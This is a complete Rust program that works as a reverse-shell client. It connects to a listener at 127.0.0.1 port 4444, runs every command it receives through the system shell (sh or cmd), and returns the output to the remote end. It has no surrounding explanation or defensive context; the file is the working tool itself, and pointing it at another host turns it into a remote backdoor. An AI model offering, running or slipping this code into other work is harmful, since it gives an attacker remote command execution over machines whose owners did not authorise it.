use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::Command;

fn main() -> std::io::Result<()> {
    // Connect to the server
    let mut stream = TcpStream::connect("127.0.0.1:4444")?;
    println!("Connected to server at 127.0.0.1:4444");

    let mut buffer = [0u8; 4096];

    loop {
        // Wait for incoming command from the server
        let bytes_read = match stream.read(&mut buffer) {
            Ok(0) => {
                println!("Server closed the connection");
                break;
            }
            Ok(n) => n,
            Err(e) => {
                eprintln!("Error reading from server: {}", e);
                break;
            }
        };

        // Convert received bytes to string and trim whitespace/newlines
        let command = String::from_utf8_lossy(&buffer[..bytes_read])
            .trim()
            .to_string();

        if command.is_empty() {
            continue;
        }

        // Allow a way to exit cleanly
        if command == "exit" || command == "quit" {
            println!("Exit command received, shutting down");
            break;
        }

        println!("Executing command: {}", command);

        // Execute the command using the system shell
        let output = if cfg!(target_os = "windows") {
            Command::new("cmd").args(["/C", &command]).output()
        } else {
            Command::new("sh").arg("-c").arg(&command).output()
        };

        // Build the response (stdout + stderr) and send it back to the server
        let response = match output {
            Ok(out) => {
                let mut combined = Vec::new();
                combined.extend_from_slice(&out.stdout);
                combined.extend_from_slice(&out.stderr);
                if combined.is_empty() {
                    combined.extend_from_slice(b"<no output>\n");
                }
                combined
            }
            Err(e) => format!("Failed to execute command: {}\n", e).into_bytes(),
        };

        // Print the result locally
        print!("{}", String::from_utf8_lossy(&response));

        // Send the result back to the server
        if let Err(e) = stream.write_all(&response) {
            eprintln!("Error writing to server: {}", e);
            break;
        }
        if let Err(e) = stream.flush() {
            eprintln!("Error flushing stream: {}", e);
            break;
        }
    }

    Ok(())
}

